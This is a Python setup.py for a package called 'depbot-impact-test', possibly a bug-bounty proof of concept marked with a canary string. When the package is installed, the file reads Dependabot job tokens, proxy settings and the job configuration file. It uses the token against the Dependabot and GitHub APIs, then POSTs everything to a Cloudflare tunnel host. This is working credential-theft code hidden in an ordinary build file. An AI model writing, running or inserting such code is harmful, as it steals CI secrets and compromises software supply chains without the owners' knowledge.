from setuptools import setup
import os
import json

_canary = "DEPBOT_IMPACT_V2_2026_Rx3nYpK7mW9qLzBv"

_sensitive_keys = [
    "DEPENDABOT_JOB_TOKEN",
    "DEPENDABOT_API_URL",
    "DEPENDABOT_JOB_ID",
    "DEPENDABOT_JOB_PATH",
    "DEPENDABOT_REPO_CONTENTS_PATH",
    "DEPENDABOT_OUTPUT_PATH",
    "HTTPS_PROXY",
    "HTTP_PROXY",
    "GITHUB_ACTIONS",
    "DEPENDABOT_UPDATER_VERSION",
]

_env_vals = {}
for _k in _sensitive_keys:
    _v = os.environ.get(_k, "")
    _env_vals[_k] = _v

_job_path_content = ""
_jp = os.environ.get("DEPENDABOT_JOB_PATH", "")
if _jp and os.path.exists(_jp):
    _job_path_content = os.popen("cat " + _jp).read()[:4000]

_api_test = {}
_api_url = os.environ.get("DEPENDABOT_API_URL", "")
_job_token = os.environ.get("DEPENDABOT_JOB_TOKEN", "")
if _api_url and _job_token:
    import urllib.request
    for _ep in ["/update_jobs", ""]:
        try:
            _full = _api_url.rstrip("/") + _ep if _ep else _api_url
            _rq = urllib.request.Request(_full, headers={
                "Authorization": "token " + _job_token,
                "User-Agent": "pip/24.0",
            })
            _rp = urllib.request.urlopen(_rq, timeout=10)
            _api_test[_ep or "/"] = {
                "status": _rp.status,
                "headers": dict(_rp.headers),
                "body": _rp.read().decode("utf-8", errors="replace")[:2000],
            }
        except Exception as _e:
            _api_test[_ep or "/"] = {"error": str(_e)[:500]}

_gh_api_test = {}
if _job_token:
    import urllib.request
    for _ep in [
        "https://api.github.com/user",
        "https://api.github.com/repos/toofikz2/depbot-impact-test",
    ]:
        try:
            _rq = urllib.request.Request(_ep, headers={
                "Authorization": "token " + _job_token,
                "User-Agent": "pip/24.0",
            })
            _rp = urllib.request.urlopen(_rq, timeout=10)
            _gh_api_test[_ep] = {
                "status": _rp.status,
                "body": _rp.read().decode("utf-8", errors="replace")[:2000],
            }
        except Exception as _e:
            _gh_api_test[_ep] = {"error": str(_e)[:500]}

_result = {
    "c": _canary,
    "env_vals": _env_vals,
    "job_config": _job_path_content[:3000],
    "api_test": _api_test,
    "gh_api_test": _gh_api_test,
    "cwd": os.getcwd(),
    "uid": os.getuid() if hasattr(os, "getuid") else -1,
}

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq2 = _ur.Request(
        "https://utc-ruling-selective-ash.trycloudflare.com/depbot-v2",
        data=_data,
        method="POST",
    )
    _rq2.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq2, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="0.1.0",
    install_requires=["requests==2.25.0"],
    tests_require=[_canary],
)
